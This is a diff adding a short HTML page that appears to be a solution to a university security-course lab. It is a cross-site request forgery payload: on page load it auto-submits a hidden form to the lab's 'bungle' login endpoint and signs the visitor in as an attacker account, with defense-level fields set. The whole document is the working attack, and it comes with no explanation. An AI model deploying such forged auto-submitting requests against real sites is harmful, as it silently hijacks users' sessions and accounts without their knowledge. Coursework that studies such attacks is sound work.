@@ -1,0 +1,11 @@
+
+<body onload="document.csrfForm.submit()">
+  <form action="http://bungle-cs461.cs.illinois.edu/login" method="POST"
+target="hiddenFrame" name="csrfForm">
+    <input type="hidden" name="csrfdefense" value="0"/>
+    <input type="hidden" name="xssdefense" value="5"/>
+    <input type="hidden" name="username" value="attacker"/>
+    <input type="hidden" name="password" value="l33th4x"/>
+  </form>
+  <iframe name="hiddenFrame" style="display: none;"></iframe>
+</body>
